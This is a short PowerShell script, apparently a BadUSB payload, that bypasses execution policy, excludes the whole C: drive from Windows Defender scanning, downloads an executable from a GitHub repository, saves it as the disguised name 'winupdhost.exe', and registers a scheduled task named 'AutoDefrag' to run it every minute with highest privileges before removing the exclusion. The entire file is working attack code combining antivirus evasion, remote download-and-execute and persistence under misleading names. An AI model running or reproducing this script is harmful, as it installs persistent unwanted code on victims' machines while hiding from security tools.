cd $env:Temp;
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
Add-MpPreference -ExclusionPath C:/;
iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.exe -O winupdhost.exe -UseBasicParsing;
Start-Sleep 1;
schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
Remove-MpPreference -ExclusionPath C:/;
exit
